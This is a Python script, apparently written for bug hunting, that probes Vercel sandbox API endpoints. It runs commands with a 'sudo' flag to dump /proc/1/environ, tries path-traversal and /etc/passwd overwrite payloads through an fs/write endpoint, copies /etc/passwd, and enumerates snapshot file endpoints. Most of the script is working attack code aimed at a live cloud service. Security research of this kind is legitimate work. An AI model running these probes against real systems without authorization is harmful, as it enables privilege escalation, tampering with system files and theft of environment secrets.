# -*- coding: utf-8 -*-
"""非传统面E: CLI 隐藏面 — ①cmd sudo 参数 ②fs/write 文件上传端点 ③snapshots get/tree"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s): print(s, flush=True)

api("DELETE", "/v2/sandboxes/n20?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n20"}, 60)
if c != 200:
    log('create fail %s' % r[:200]); sys.exit(1)
d = json.loads(r)['sandbox']
sid = d['currentSessionId']
log('sid=%s' % sid)
time.sleep(3)

# ① sudo 参数
log('')
log('===== ① cmd sudo =====')
for tag, body in [
    ('sudo-true', {"command": "id", "args": [], "wait": True, "timeout": 8000, "sudo": True}),
    ('sudo-shell', {"command": "sh", "args": ["-c", "id -u && cat /proc/self/status | head -5"],
                    "wait": True, "timeout": 8000, "sudo": True}),
    ('sudo-proc', {"command": "sh", "args": ["-c", "ls -la /proc | head -20; cat /proc/1/cmdline 2>/dev/null; echo ---; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -20"],
                   "wait": True, "timeout": 10000, "sudo": True}),
]:
    c, r = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM), body, 25)
    log('[%s] -> %s | %s' % (tag, c, (r[:400] if r else '').replace(chr(10), ' ')))

# ② fs/write 端点
log('')
log('===== ② fs/write =====')
for tag, body in [
    ('write-basic', {"path": "/tmp/cli_copy_test.txt", "content": "CLI_COPY_TEST_2026"}),
    ('write-traversal', {"path": "../../../../tmp/trav.txt", "content": "TRAV"}),
    ('write-abs', {"path": "/etc/passwd", "content": "EVIL"}),
    ('write-proc', {"path": "/proc/self/environ", "content": "X"}),
]:
    c, r = api("POST", "/v2/sandboxes/sessions/%s/fs/write?teamId=%s" % (sid, TEAM), body, 20)
    log('[%s] -> %s | %s' % (tag, c, (r[:200] if r else '').replace(chr(10), ' ')))

# fs/write 其他变体 (CLI copy 可能用 multipart/raw)
c, r = api("POST", "/v2/sandboxes/sessions/%s/fs/copy?teamId=%s" % (sid, TEAM),
           {"src": "/etc/passwd", "dest": "/tmp/pw.txt"}, 20)
log('[fs/copy] -> %s | %s' % (c, (r[:200] if r else '').replace(chr(10), ' ')))

# ③ snapshots get / tree
log('')
log('===== ③ snapshots get/tree =====')
c, r = api("GET", "/v2/sandboxes/snapshots?project=%s" % PROJ, None, 20)
snaps = []
if c == 200:
    try:
        snaps = [s['id'] for s in json.loads(r).get('snapshots', []) if s.get('status') == 'created']
    except Exception: pass
log('snapshots: %s' % snaps[:5])
if snaps:
    s0 = snaps[0]
    c, r = api("GET", "/v2/sandboxes/snapshots/%s?project=%s" % (s0, PROJ), None, 20)
    log('[snap get] -> %s | %s' % (c, (r[:300] if r else '').replace(chr(10), ' ')))
    for p in ['/tree', '/files', '/contents', '/fs']:
        c, r = api("GET", "/v2/sandboxes/snapshots/%s%s?project=%s" % (s0, p, PROJ), None, 20)
        log('[snap%s] -> %s | %s' % (p, c, (r[:150] if r else '').replace(chr(10), ' ')))

# 验证 write 结果
c, r = api("POST", "/v2/sandboxes/sessions/%s/fs/read?teamId=%s" % (sid, TEAM), {"path": "/tmp/cli_copy_test.txt"}, 20)
log('read-back -> %s | %s' % (c, (r[:150] if r else '').replace(chr(10), ' ')))

api("DELETE", "/v2/sandboxes/n20?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
